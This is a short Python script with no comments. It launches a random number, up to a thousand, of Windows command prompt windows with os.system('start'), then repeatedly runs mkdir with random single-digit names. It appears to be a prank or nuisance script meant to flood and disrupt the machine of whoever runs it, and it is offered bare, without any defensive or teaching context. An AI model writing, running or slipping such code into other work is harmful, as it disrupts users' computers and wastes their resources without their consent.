import os
import random

num = random.randint(1,1000)
files = random.randint(1,1000)


for i in range(num):
    os.system("start")

for x in range(files):
    os.system(f"mkdir {random.randint(1,9)} ")
